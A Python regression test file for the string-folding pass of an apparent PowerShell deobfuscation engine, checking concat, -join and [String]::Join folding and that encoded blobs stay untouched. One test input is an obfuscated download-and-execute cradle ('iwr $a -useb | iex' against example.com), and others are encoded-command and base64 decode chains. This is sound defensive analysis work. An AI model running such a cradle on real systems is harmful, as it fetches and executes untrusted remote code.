"""
M2 · Structural Pass — regression tests.

Verifies:
  * ``structural-string-concat-fold`` folds single- and double-quoted
    concat pairs.
  * ``structural-join-operator-fold`` folds ``('a','b') -join 'sep'``.
  * ``structural-static-join-fold`` folds ``[String]::Join('sep', (…))``.
  * Interpolated double-quoted strings are NEVER folded.
  * Encoded / Base64 / EncodedCommand payloads are NEVER modified.
  * Every fold is idempotent.
  * The pass is deterministic (identical output on identical input).
"""
from __future__ import annotations

import pytest

from workspace.convergence import Artifact, converge
from workspace.convergence.structural import run as structural_run


# ─── Direct pass-level tests (no engine loop) ───────────────────────


def _run(payload: str) -> tuple[str, tuple[str, ...], bool]:
    art, record = structural_run(Artifact.from_input(payload))
    return art.content, record.transformations, record.changed


class TestStringConcatFold:
    def test_single_quote_pair(self) -> None:
        out, xf, changed = _run("$a='ht'+'tp'")
        assert out == "$a='http'"
        assert changed is True
        assert any(x.startswith("structural-string-concat-fold") for x in xf)

    def test_double_quote_pair(self) -> None:
        out, _, _ = _run('$a="ht"+"tp"')
        assert out == '$a="http"'

    def test_interpolated_double_quotes_are_skipped(self) -> None:
        """Double-quoted strings containing $ must NOT be folded — they
        may reference variables whose values change semantics."""
        payload = '"$env:foo"+"bar"'
        out, xf, changed = _run(payload)
        assert out == payload, "Interpolated DQ string must be preserved"
        assert changed is False
        assert xf == ()

    def test_backtick_escape_double_quotes_are_skipped(self) -> None:
        payload = '"a`nb"+"c"'
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False

    def test_subexpression_double_quotes_are_skipped(self) -> None:
        payload = '"$(x)"+"y"'
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False

    def test_single_pass_folds_pairwise_engine_completes_chain(self) -> None:
        """A single call folds pairwise; the outer engine loop
        completes the chain across successive iterations."""
        # Direct pass call: only one pair folds per call.
        out, _, _ = _run("'a'+'b'+'c'+'d'")
        assert out in ("'ab'+'cd'", "'abc'+'d'")  # depends on regex overlap semantics
        # Through the engine loop: entire chain resolves.
        result = converge(Artifact.from_input("'a'+'b'+'c'+'d'"))
        assert result.final_artifact.content == "'abcd'"
        assert result.canonical is True

    def test_idempotent(self) -> None:
        payload = "'already'+'done'"
        first, _, _ = _run(payload)
        second, _, changed_second = _run(first)
        assert first == second
        assert changed_second is False

    def test_no_op_on_plain_text(self) -> None:
        payload = "Write-Host 'hello'"
        out, xf, changed = _run(payload)
        assert out == payload
        assert changed is False
        assert xf == ()


class TestJoinOperatorFold:
    def test_basic_empty_separator(self) -> None:
        out, xf, changed = _run("('a','b','c') -join ''")
        assert out == "'abc'"
        assert changed is True
        assert any("join-operator" in x for x in xf)

    def test_non_empty_separator(self) -> None:
        out, _, _ = _run("('a','b','c') -join ','")
        assert out == "'a,b,c'"

    def test_case_insensitive(self) -> None:
        out, _, _ = _run("('a','b') -JoIn ''")
        assert out == "'ab'"

    def test_mixed_quote_styles_are_skipped(self) -> None:
        """If any array element is double-quoted, we do not fold — keeps
        the safety guarantee simple."""
        payload = '("a", \'b\', \'c\') -join \'\''
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False

    def test_idempotent(self) -> None:
        first, _, _ = _run("('a','b') -join ''")
        second, _, changed = _run(first)
        assert first == second
        assert changed is False


class TestStaticJoinFold:
    def test_basic(self) -> None:
        out, xf, changed = _run("[String]::Join('', ('a','b','c'))")
        assert out == "'abc'"
        assert changed is True
        assert any("static-join" in x for x in xf)

    def test_case_insensitive_type(self) -> None:
        out, _, _ = _run("[sTrInG]::JoIn('', ('a','b','c'))")
        assert out == "'abc'"

    def test_system_string_alias(self) -> None:
        out, _, _ = _run("[System.String]::Join('-', ('a','b','c'))")
        assert out == "'a-b-c'"

    def test_idempotent(self) -> None:
        first, _, _ = _run("[String]::Join(',', ('a','b'))")
        second, _, changed = _run(first)
        assert first == second
        assert changed is False


# ─── Zero-touch guarantees on obfuscated / encoded payloads ─────────


class TestNoTouchOnEncodedContent:
    """The structural pass must NEVER modify content inside quoted
    strings — this is what lets it run on Base64, EncodedCommand, and
    other opaque blobs without risk of corruption."""

    def test_base64_string_literal_preserved(self) -> None:
        payload = "$b='SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACkA'"
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False

    def test_powershell_encoded_command_preserved(self) -> None:
        payload = "powershell.exe -encod VwByAGkAdABlAC0ASABvAHMAdAA="
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False

    def test_bash_pipe_chain_preserved(self) -> None:
        payload = "echo 'abc=' | rev | base64 -d | xxd -r -p"
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False


# ─── End-to-end via the engine ──────────────────────────────────────


def test_s04_style_full_convergence() -> None:
    """S04 anchor pattern: PowerShell string concatenation must resolve
    to a canonical URL through the engine loop."""
    payload = "$a='ht'+'tp'+'://ex'+'ample.com/x'; iwr $a -useb | iex"
    result = converge(Artifact.from_input(payload))
    assert result.canonical is True
    assert "'http://example.com/x'" in result.final_artifact.content
    assert result.certificate.structural_changes >= 1


def test_deterministic_output() -> None:
    payload = "$a='foo'+'bar'+'baz'"
    a = converge(Artifact.from_input(payload))
    b = converge(Artifact.from_input(payload))
    assert a.final_artifact.content == b.final_artifact.content
    assert a.certificate.fingerprint == b.certificate.fingerprint


@pytest.mark.parametrize(
    "payload,expected",
    [
        ("'a'+'b'", "'ab'"),
        ("'a'+'b'+'c'", "'abc'"),
        ("('a','b','c') -join ''", "'abc'"),
        ("('a','b') -join '-'", "'a-b'"),
        ("[String]::Join('', ('a','b','c'))", "'abc'"),
        ("[sTrInG]::JoIn(',', ('a','b'))", "'a,b'"),
        # Nested: static-join produces a literal that adjacent concat can then fold.
        ("[String]::Join('', ('a','b'))+'cd'", "'abcd'"),
        # No-op inputs — must be preserved verbatim.
        ("Write-Host 'hello'", "Write-Host 'hello'"),
        ('"$env:x"+"y"', '"$env:x"+"y"'),
    ],
)
def test_end_to_end_matrix(payload: str, expected: str) -> None:
    result = converge(Artifact.from_input(payload))
    assert result.final_artifact.content == expected
    assert result.canonical is True
